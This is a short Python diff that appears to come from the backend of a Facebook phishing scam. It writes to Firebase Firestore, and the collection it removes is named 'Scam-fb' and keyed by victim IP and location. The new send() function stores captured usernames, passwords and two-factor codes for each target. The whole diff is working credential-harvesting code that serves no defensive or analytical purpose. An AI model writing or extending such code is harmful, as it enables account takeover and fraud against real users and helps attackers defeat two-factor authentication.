@@ -10,23 +10,12 @@ app = firebase_admin.get_app()
 auth.Client(app)
 db = firestore.client(app)
 
-def send(ip,vitri,data):
-    loi = 0
-    doc =  db.collection(u'Scam-fb').get()
-    for name in doc:
-        if ip == name.id:
-            loi = 1
-            break
-    if loi == 1:
-        db.collection('Scam-fb').document(ip).update({'Data':firestore.ArrayUnion([data])})
-
-    if loi == 0:
-        doc_ref = db.collection(u'Scam-fb').document(ip)
-        doc_ref.set({
-            'ip' : ip,
-            'vitri' : vitri,
-            'Data':firestore.ArrayUnion([data])
-            })
+def send(loai,tk,mk,name,FACode):
+    doc_ref = db.collection(name).document(name)
+    doc_ref.set({
+        'loai' : loai,
+        'Data':firestore.ArrayUnion([{'TK':tk,'MK':mk,'2FA':FACode}])
+        })
 
 
 
@@ -38,4 +27,3 @@ def get_data():
         out = {name.id:tt}
         cong  += [out]
     return cong
-
